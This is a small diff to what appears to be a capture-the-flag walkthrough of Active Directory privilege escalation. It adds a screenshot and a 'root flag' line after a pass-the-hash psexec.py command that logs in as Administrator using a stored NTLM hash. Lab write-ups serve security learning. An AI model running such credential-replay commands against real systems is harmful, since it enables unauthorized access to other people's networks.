@@ -263,4 +263,7 @@ To exploit this, we will change the UPN of the user `p.agila` to Administrator, 
 
 `psexec.py Administrator@10.129.10.195 -hashes $(cat creds/administrator.ntlm_hash)`
 
+<img width="822" height="476" alt="image" src="https://github.com/user-attachments/assets/d40f011c-cd97-4075-ba79-05a7e8c03a6b" />
+
+We got the root flag! Pwned the box
 
